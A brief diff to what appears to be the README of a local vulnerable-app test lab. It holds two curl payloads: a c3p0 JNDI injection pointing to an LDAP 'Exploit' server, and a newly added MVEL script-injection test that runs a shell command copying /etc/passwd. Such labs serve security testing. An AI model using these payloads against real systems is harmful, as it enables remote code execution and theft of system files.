@@ -55,3 +55,7 @@
    ```
    curl 127.0.0.1:8080/jodd/parse -d 'type=com.mchange.v2.c3p0.JndiRefForwardingDataSource&json={"jndiName":"ldap://127.0.0.1:1389/Exploit","loginTimeout":0}'
    ```
+15. 测试mvel脚本
+   ```
+   curl 127.0.0.1:8080/mvel/parse -d 'mvel=Runtime.getRuntime().exec("cp /etc/passwd /tmp")'
+   ```
